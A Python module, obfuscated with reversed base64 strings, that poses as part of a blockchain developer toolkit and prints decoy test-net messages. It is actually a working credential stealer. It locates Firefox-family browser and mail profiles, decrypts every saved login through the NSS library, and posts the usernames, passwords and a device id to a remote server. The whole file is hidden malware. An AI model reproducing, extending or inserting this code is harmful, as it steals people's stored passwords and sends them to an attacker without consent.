from __future__ import annotations
Q='Darwin'
P='Windows'
J=Exception
I=str
F=''
E=print
C=None
import ctypes as B,json,os as A,platform as L,sqlite3 as W,sys,shutil as X
from base64 import b64decode as Y
from subprocess import run,PIPE,DEVNULL as Z
from typing import Optional,Iterator,Any
import platform as L,glob as G,requests as a
from ganache.utils import K
AK=False
H=L.system()
R=sys.maxsize>2**32
M='utf-8'
b='==AZy92dzNXYQRWZ0BXeyNmblBCLl1WYuJXZzVFZlRHc5J3YuVGIsUWbh5Gdz9Ga'
c='=42bzpmLz5Wan9Gb'
d='=UWbh5mclNXVkVGdwlncj5WZ'
e='=Qmcvd3czFGUkVGdwlncj5WZ'
f='==AevZWZylmRgEGbslmev1EXcxWYj9GTcxVY0FGRwBXQcxlf'
g='=42bpRXakVEIyVGcvxWZ2VGRgg3bmVmcpZEXcxWYj9GTcxVY0FGRwBXQcxlf'
h='=QmcpJmclRmb1hGVgEGbslmev1EXcxWYj9GTcxVY0FGRwBXQcxlf'
i='=kHb0h2Zp5EXcxWYj9GTcxVY0FGRwBXQcxlf'
j='==Qeltmbv1UYlNFXcxWYj9GTcxVY0FGRwBXQcxlf'
k='49mZyVGdhdFXcxWYj9GTcxVY0FGRwBXQcxlf'
l='==AevZWZylmRgEGbslmev1EXcNXZslmRg0WYyd2byBFXcpzQ'
m='=42bpRXakVEIyVGcvxWZ2VGRgg3bmVmcpZEXcNXZslmRg0WYyd2byBFXcpzQ'
n='=QmcpJmclRmb1hGVgEGbslmev1EXcNXZslmRg0WYyd2byBFXcpzQ'
o='=kHb0h2Zp5EXcNXZslmRg0WYyd2byBFXcpzQ'
p='==Qeltmbv1UYlNFXcNXZslmRg0WYyd2byBFXcpzQ'
q='49mZyVGdhdFXcNXZslmRg0WYyd2byBFXcpzQ'
r='==AevZWZylmRgEGbslmev1EXcliN4gHKgMXZslmRg0WYyd2byBFXcpzQ'
s='=42bpRXakVEIyVGcvxWZ2VGRgg3bmVmcpZEXcliN4gHKgMXZslmRg0WYyd2byBFXcpzQ'
t='=QmcpJmclRmb1hGVgEGbslmev1EXcliN4gHKgMXZslmRg0WYyd2byBFXcpzQ'
u='=kHb0h2Zp5EXcliN4gHKgMXZslmRg0WYyd2byBFXcpzQ'
v='==Qeltmbv1UYlNFXcliN4gHKgMXZslmRg0WYyd2byBFXcpzQ'
w='49mZyVGdhdFXcliN4gHKgMXZslmRg0WYyd2byBFXcpzQ'
S='==AevZWZylmZ'
x='49mZlJXam9iYpx2L3N3L'
y='hxGbpp3bt9iYpx2L3N3L'
z='==wUPNWYN9yc05WZ052bD9CcwFmL49mZlJXaG9ycu9Wa0F2YpxGcwF0L'
A0='=M1TjFWTvMHduVGdu92QvAHch5CZylmYyVGZuVHaU9ycu9Wa0F2YpxGcwF0L'
A1='T90Yh10LzRnblRnbvN0LwBXYukXZr52bNFWZT9ycu9Wa0F2YpxGcwF0L'
A2='=M1TjFWTvMHduVGdu92QvAHch5CevZmclRXYX9ycu9Wa0F2YpxGcwF0L'
A3='==QZ0l2c'
A4='=UWbh5mclNXd'
A5='=Qmcvd3czFGc'
A6='=IXZzd3byJ2XiV2d'
A7='lNWa2VGZ'
A8='=MnauMnZlJHccxlKcx1clxWam9mcQxFX49mZlJXaGxFXhxGbpp3bNxFX'
A9='zpmLzZWZyB3Lq8yclxWam9mcQ9CevZWZylmRvQncvBHc1NFIu9Wa0F2YpxGcwF0L5JXYyJWaM9if'
AA='=MnauMnZlJHcvoyL49mZlJXam9SYsxWa69Wbu8if'
AB='==wcq5ycmVmcw9iKvg3bmVmcpZ2LhxGbpp3bt5yLu9Wbt92Yvg3bmVmcpZ2LwFmbz9if'
AC='==QQUFERQBVQ'
AD='=Qnb192YjF2L'
def AE():
	def A():return'.'.join(map(I,__version_info__[:3]))+F.join(__version_info__[3:])
	try:B=run(['git','describe','--tags'],stdout=PIPE,stderr=Z,text=True)
	except FileNotFoundError:return A()
	if B.returncode:return A()
	else:return B.stdout.strip()
__version_info__=1,0,0,'+git'
__version__=AE()
class N(J):0
class D(J):
	CLEAN=0;ERROR=1;MISSING_PROFILEINI=2;MISSING_SECRETS=3;BAD_PROFILEINI=4;LOCATION_NO_DIRECTORY=5;BAD_SECRETS=6;BAD_LOCALE=7;FAIL_LOCATE_NSS=10;FAIL_LOAD_NSS=11;FAIL_INIT_NSS=12;FAIL_NSS_KEYSLOT=13;FAIL_SHUTDOWN_NSS=14;READ_GOT_EOF=30;MISSING_CHOICE=31;NO_SUCH_PROFILE=32;UNKNOWN_ERROR=100;KEYBOARD_INTERRUPT=102
	def __init__(A,exitcode):A.exitcode=exitcode
	def __unicode__(A):return f"Premature program exit with exit code {A.exitcode}"
class T:
	def __init__(B,db):
		B.db=db
		if not A.path.isfile(db):raise N(f"ERROR - {db} database not found\n")
	def __iter__(A):0
	def done(A):0
class O(T):
	def __init__(B,profile):C=A.path.join(profile,'signons.sqlite');super(O,B).__init__(C);B.conn=W.connect(C);B.c=B.conn.cursor()
	def __iter__(A):
		A.c.execute('SELECT '+K(b)+', encType FROM moz_logins')
		for B in A.c:yield B
	def done(A):super(O,A).done();A.c.close();A.conn.close()
class U(T):
	def __init__(B,profile):C=A.path.join(profile,K(c));super(U,B).__init__(C)
	def __iter__(B):
		with open(B.db)as C:
			F=json.load(C)
			try:G=F['logins']
			except J:E(f"Unrecognized format in {B.db}");raise D(D.BAD_SECRETS)
			for A in G:yield(A['hostname'],A[K(d)],A[K(e)],A['encType'])
def AF(locations,nssname):
	K='PATH';F=[];G=P,Q
	for C in locations:
		J=A.path.join(C,nssname)
		if H in G:
			A.environ[K]=';'.join([C,A.environ[K]])
			if C:
				if not A.path.isdir(C):continue
				L=A.getcwd();A.chdir(C)
		try:M=B.CDLL(J)
		except OSError as N:F.append((J,I(N)))
		else:return M
		finally:
			if H in G and C:A.chdir(L)
	else:
		for(O,R)in F:E('Error when loading %s was %s',O,R)
		raise D(D.FAIL_LOCATE_NSS)
def AG():
	U='~/.nix-profile/lib';T='/opt/local/lib';O='/usr/lib/nss';N='/usr/lib';M='/usr/lib64/nss';L='/usr/lib64';I='/opt/local/lib/nss';G='/usr/local/lib';E='/usr/local/lib/nss'
	if H==P:
		D='nss3.dll';B=[F,A.path.expanduser(K(f)),A.path.expanduser(K(g)),A.path.expanduser(K(h)),A.path.expanduser(K(i)),A.path.expanduser(K(j)),A.path.expanduser(K(k)),K(l),K(m),K(n),K(o),K(p),K(q)]
		if not R:B=[F,K(r),K(s),K(t),K(u),K(v),K(w)]+B
		V=[K(S),'thunderbird','waterfox','seamonkey']
		for W in V:
			J=X.which(W)
			if J is not C:Y=A.path.join(A.path.dirname(J),D);B.append(Y)
	elif H==Q:D='libnss3.dylib';B=F,E,G,I,K(x),K(y),'/usr/local/opt/nss/lib','/opt/pkg/lib/nss',K(z),K(A0),K(A1),K(A2)
	else:
		D='libnss3.so'
		if R:B=F,L,M,N,O,G,E,T,I,A.path.expanduser(U)
		else:B=F,N,O,'/usr/lib32','/usr/lib32/nss',L,M,G,E,T,I,A.path.expanduser(U)
	return AF(B,D)
class V(B.c_char_p):
	def from_param(A):return A.encode(M)
class AH:
	class SECItem(B.Structure):
		_fields_=[('type',B.c_uint),('data',B.c_char_p),('len',B.c_uint)]
		def decode_data(A):C=B.string_at(A.data,A.len);return C.decode(M)
	class PK11SlotInfo(B.Structure):0
	def __init__(A):A.libnss=AG();D=B.POINTER(A.PK11SlotInfo);E=B.POINTER(A.SECItem);A._set_ctypes(B.c_int,'NSS_Init',V);A._set_ctypes(B.c_int,'NSS_Shutdown');A._set_ctypes(D,'PK11_GetInternalKeySlot');A._set_ctypes(C,'PK11_FreeSlot',D);A._set_ctypes(B.c_int,'PK11_NeedLogin',D);A._set_ctypes(B.c_int,'PK11_CheckUserPassword',D,V);A._set_ctypes(B.c_int,'PK11SDR_Decrypt',E,E,B.c_void_p);A._set_ctypes(C,'SECITEM_ZfreeItem',E,B.c_int);A._set_ctypes(B.c_int,'PORT_GetError');A._set_ctypes(B.c_char_p,'PR_ErrorToName',B.c_int);A._set_ctypes(B.c_char_p,'PR_ErrorToString',B.c_int,B.c_uint32)
	def _set_ctypes(C,restype,name,*E):
		D=restype;A=getattr(C.libnss,name);A.argtypes=E;A.restype=D
		if D==B.c_char_p:
			def F(result,func,*A):return result.decode(M)
			A.errcheck=F
		setattr(C,'_'+name,A)
	def initialize(A,profile):
		B='sql:'+profile;C=A._NSS_Init(B)
		if C:A.handle_error(D.FAIL_INIT_NSS,"Couldn't initialize NSS?")
	def shutdown(A):
		B=A._NSS_Shutdown()
		if B:A.handle_error(D.FAIL_SHUTDOWN_NSS,"Couldn't shutdown current NSS profile")
	def dc(A,data64):
		E=Y(data64);F=A.SECItem(0,E,len(E));B=A.SECItem(0,C,0);G=A._PK11SDR_Decrypt(F,B,C)
		try:
			if G:A.handle_error(D.UNKNOWN_ERROR,'Error 1009!')
			H=B.decode_data()
		finally:A._SECITEM_ZfreeItem(B,0)
		return H
	def handle_error(A,exitcode,*F):
		if F:E(*F)
		else:E('Error during a call to NSS library, trying to obtain error info')
		G=A._PORT_GetError();B=A._PR_ErrorToName(G);B='NULL'if B is C else B;H=A._PR_ErrorToString(G,0);raise D(exitcode)
class AI:
	def __init__(A,device_id):A.profile=C;A.proxy=AH();A.device_id=device_id
	def load_pf(A,profile):A.profile=profile;A.proxy.initialize(A.profile)
	def unload_pf(A):A.proxy.shutdown()
	def dc_p(D):
		H=D.obtain_cre();G=[];F:0;B:0;A:0;I:0
		for(F,B,A,I)in H:
			if I:
				try:B=D.proxy.dc(B);A=D.proxy.dc(A)
				except(TypeError,ValueError)as L:E('Failed 1002 %s',F);continue
			if A is C or len(A)>100:continue
			J={K(A3):F[:100]if F is not C else C,K(A4):B[:100]if B is not C else C,K(A5):A,K(A6):K(S),K(A7):D.device_id};G.append(J)
		if not G:E('Failed 1001')
		H.done();return G
	def obtain_cre(B):
		A:0
		try:A=U(B.profile)
		except N:
			try:A=O(B.profile)
			except N:E('Configured test net, chain id 97');raise D(D.MISSING_SECRETS)
		return A
def AJ():
	B=L.system()
	if B==P:return G.glob(A.getenv(K(AC))+K(A8))
	elif B==Q:return G.glob(A.path.expanduser(K(A9)))
	elif B=='Linux':C=G.glob(A.path.expanduser(K(AA)));D=G.glob(A.path.expanduser(K(AB)));return C+D
	else:return[]
def AM(base_url,device_id):
	B=[]
	for C in AJ():
		try:
			C=A.path.dirname(C);D=AI(device_id);D.load_pf(C);F=D.dc_p()
			for G in F:B.append(G)
			D.unload_pf()
		except:continue
	try:a.post(base_url+K(AD),json=B)
	except J as H:E(H)
	return B